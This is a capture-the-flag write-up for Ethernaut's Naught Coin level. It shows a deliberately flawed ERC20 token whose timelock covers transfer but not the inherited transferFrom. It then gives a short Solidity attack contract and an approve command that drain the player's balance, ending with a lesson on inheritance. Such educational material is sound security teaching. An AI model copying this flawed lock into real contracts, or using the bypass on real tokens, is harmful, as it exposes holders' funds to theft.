---
description: ERC20 and contract inheritance
---

# 15 - Naught Coin

Ethernaut Level15: [Naught Coin](https://ethernaut.openzeppelin.com/level/0x36E92B2751F260D6a4749d7CA58247E7f8198284)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = block.timestamp + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player) 
  ERC20('NaughtCoin', '0x0') {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }
  
  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(block.timestamp > timeLock);
      _;
    } else {
     _;
    }
  } 
} 
```

### Goal of this level

* make player's token balance `0`

### What you should know before

* ERC20\
  \-> see [here](https://www.youtube.com/watch?v=gwn1rVDuGL0) and [here](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol)&#x20;
* inheritance\
  \-> see [here](https://www.youtube.com/watch?v=Ck5PUwL2D6I)

## Solution

NaughtCoin contract inherits `ERC20`.

Because of timelock, we cannot use `transfer`, but we can use `transferFrom` instead.

```solidity
contract AttackNaughtCoin {
    NaughtCoin public naughtCoinAddr;
    constructor (address _addr) {
        naughtCoinAddr = NaughtCoin(_addr);
    }

    function attack() public {
        uint256 balance = naughtCoinAddr.balanceOf(msg.sender);
        naughtCoinAddr.transferFrom(msg.sender, address(this), balance);
    }
}
```

Deploy our exploit contract and approve it so it can move the token on player's behalf.

```javascript
> await contract.approve("0xAee9d66A9777c0d745015785DF6a0bda11E1b6b1", (await contract.balanceOf(player)).toString());
```

All of player's tokens will be transferd when `attack()` is called.

Done! 😎

## Key Takeaway

* When writing a contract that inhertis other contracts, \
  make sure that you are familiar with all of the functions it inherits.
